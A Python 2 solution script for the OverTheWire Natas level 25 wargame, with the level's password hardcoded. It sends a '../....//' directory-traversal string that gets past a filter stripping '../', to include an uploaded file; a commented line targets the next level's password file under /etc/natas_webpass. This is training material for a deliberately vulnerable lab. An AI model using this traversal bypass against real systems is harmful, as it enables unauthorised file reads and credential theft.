#!/usr/bin/env python
# encoding: utf-8

import sys
import requests

NATAS_URL='http://natas25.natas.labs.overthewire.org/index.php'
NATAS_USER='natas25'
NATAS_PASS='GHF6X7YwACaYYssHVY05cFq83hRktl4c'
PARENT_DIR = '../....//' #. filter by safeinclude, but we can craft one
#PASSFILE = '/etc/natas_webpass/natas26' #. filter by safeinclude
PASSFILE = '/tmp/myevi1.code' #. upload file through natas9

def craft_path(level):
    return "%s%s" % (PARENT_DIR * int(level), PASSFILE)

def real_parh(path):
    return path.replace('../', '')

if __name__ == '__main__':
    if not len(sys.argv) > 1:
        level = 5
    try:
        path = craft_path(level)
        print "Craft path: %s" % (path)
        print "Real path: %s" % (real_parh(path))
        data = dict(lang=path)
        r = requests.post(url=NATAS_URL,
                         auth=(NATAS_USER, NATAS_PASS), data=data)
        print r.text
    except Exception, e:
        print e
        exit(1)

